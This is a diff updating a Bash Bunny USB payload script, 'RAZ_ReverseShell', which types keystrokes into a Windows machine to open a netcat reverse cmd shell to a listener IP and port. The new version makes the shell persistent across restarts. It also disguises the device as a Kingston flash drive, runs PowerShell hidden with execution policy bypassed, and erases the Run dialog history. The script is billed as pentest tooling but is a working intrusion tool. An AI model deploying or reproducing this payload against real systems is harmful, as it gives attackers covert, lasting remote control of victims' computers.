@@ -1,38 +1,47 @@
 #!/bin/bash
 #
 # Title:         RAZ_ReverseShell
-# Author:        RalphyZ
-# Version:       1.0
-# Target:        Windows 7+
+# Author:        RalphyZ & JamesCullum
+# Version:       2.0
+# Target:        Windows 7+ (verified on Windows 10)
 # Dependencies:  The following files must exist in the switch folder:
-#                nc.exe - Windows binary for netcat with the -e flag
-#                listener_port.txt - The Port number for the netcat listener
+#                nc.exe - Windows binary for netcat (download statically compiled ncat from https://nmap.org/ncat/, f.e. http://nmap.org/dist/ncat-portable-5.59BETA1.zip)
+#                listener_port.txt - The port number for the netcat listener
 #                listener_ip.txt - The IP Address for the netcat listener
+#                payload.ps1 - The payload being deployed
 # 
-# Description:   Executes a netcat reverse cmd shell at a given IP and Port
-#                Intentionally, this script leaves a trace in the Run Box
+# Description:   Configures a persistent netcat reverse cmd shell at a given IP and Port on the remote computer.
+#                The reverse shell establishes the connection after every windows restart and right after the attack. 
+#                This script removes the log of the run dialog.
+#                It can auto-increment the listener port so that the PenTester can create several listeners, and target multiple machines while on a walkabout in an office.
 #
 # Colors:
 # | Status     | Color                         | Description                                      |
 # | ---------- | ------------------------------| ------------------------------------------------ |
-# | SETUP      | Magenta solid                 | Setting attack mode, getting the switch position | 
+# | SETUP      | Magenta solid                 | Preparing the script and loading config          | 
 # | FAIL1      | Red slow blink                | Could not find the listener_port.txt file        | 
 # | FAIL2      | Red fast blink                | Could not find the listener_ip.txt file          | 
 # | FAIL3      | Red very fast blink           | Could not find the nc.exe file                   | 
 # | SPECIAL    | Cyan inverted single blink    | Incrementing the port in listener_port.txt       | 
-# | ATTACK     | Yellow single blink           | Running the VBScript                             | 
+# | ATTACK     | Yellow single blink           | Running the Powershell payload                   | 
 # | FINISH     | Green blink followed by SOLID | Script is finished                               | 
 
+# Options
+KEYBOARD_LANGUAGE = us     #keyboard languge
+AUTO_INCREMENT    = false  #increment port on end of every run
+
+
+######## INITIALIZATION ########
 # Magenta solid
 LED SETUP
 
-# Change this if you want to enable auto_increment of the netcat port
-# If true, the port number is increased by 1 everytime the script runs
-# This is good for Red Teams doing PenTesting on multiple computers
-auto_increment=false
 
 # Set attack mode to HID and Storage
-ATTACKMODE HID STORAGE
+# Change own identifier to random USB stick
+# - Manufacturer: Kingston 
+# - Model: DataTraveler 150 (32GB)
+# - Serial number: https://web.archive.org/web/20170711011214/https://fakeflashnews.wordpress.com/2009/03/16/kingston-counterfeit-fake-32gb-datatraveler-150-usb-flash-drive-found-on-ebay/
+ATTACKMODE HID STORAGE VID_0X0951 PID_0X1621 MAN_KINGSTON SN_00015788
 
 # Get the switch position
 GET SWITCH_POSITION
@@ -57,25 +66,37 @@ if [ ! -f "/root/udisk/payloads/${SWITCH_POSITION}/nc.exe" ] ; then
     exit 1
 fi 
 
+# If the target computer has a different language enabled, activate this here.
+# You will also need to install the language json file on the bunny.
+QUACK SET_LANGUAGE ${KEYBOARD_LANGUAGE} # older firmware
+DUCKY_LANG ${KEYBOARD_LANGUAGE} # newer firmware
+
+######## ATTACK ########
 # Start the attack - yellow single blink
 LED ATTACK
 
 # Execute the powershell command in the run box with the appropriate variables
 QUACK GUI r
-QUACK DELAY 100
-QUACK STRING powershell -WindowStyle Hidden \".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\${SWITCH_POSITION}\\nc.exe') -nv ${my_ip} ${my_port} -e cmd.exe\"
+QUACK DELAY 250
+QUACK STRING "powershell -ExecutionPolicy bypass -WindowStyle Hidden \".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\${SWITCH_POSITION}\payload.ps1') -IP ${my_ip} -Port ${my_port}\""
 QUACK ENTER
 
-
+######## FINISH ########
 # If auto_increment, then update the listener_port file
-if [ "$auto_increment" = true ] ; then   
+if [ "$AUTO_INCREMENT" = true ] ; then   
    LED SPECIAL
    echo $((my_port + 1)) > /root/udisk/payloads/${SWITCH_POSITION}/listener_port.txt
    
    # Allow the write to sync to the USB
-   sleep 1
+   SYNC
 fi
+
+# The powershell script will try to copy the nc.exe from the bunny.
+# We should give it some time to copy it, instead of disconnecting right away.
+sleep 3
+
+# Stop emulation
+ATTACKMODE OFF
 
 # Green 1000ms VERYFAST blink followed by SOLID
 LED FINISH
-exit 0
